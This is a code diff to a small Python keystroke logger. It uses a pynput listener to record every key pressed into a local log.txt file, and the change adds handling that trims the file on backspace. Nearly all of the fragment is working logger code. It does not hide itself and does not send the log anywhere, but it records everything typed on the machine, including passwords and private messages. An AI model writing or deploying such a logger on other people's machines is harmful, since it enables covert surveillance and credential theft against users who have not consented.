@@ -16,19 +16,18 @@ def on_press(key):
     key = str(key)
     key = key.replace("'", "")
     print(key)
-    with open("log.txt", "a") as f:
-        if key in alf:
+    if key in alf:
+        with open('log.txt', 'a') as f:
             f.write(key)
-        elif key == "Key.space":
+    elif key == "Key.backspace":
+        with open('log.txt', 'r+') as f:
+            f.seek(0,2)
+            f.seek(f.tell()-1,0)
+            f.truncate()
+    elif key == "Key.space":
+        with open('log.txt', 'a') as f:
             f.write(" ")
-        elif key == "Key.backspace":
-            pass
-        elif key == "Key.caps_lock":
-            pass
-        elif key == "Key.enter":
-            f.write("\n" + key + "\n")
 
 
 with Listener(on_press=on_press) as listener:
     listener.join()
-
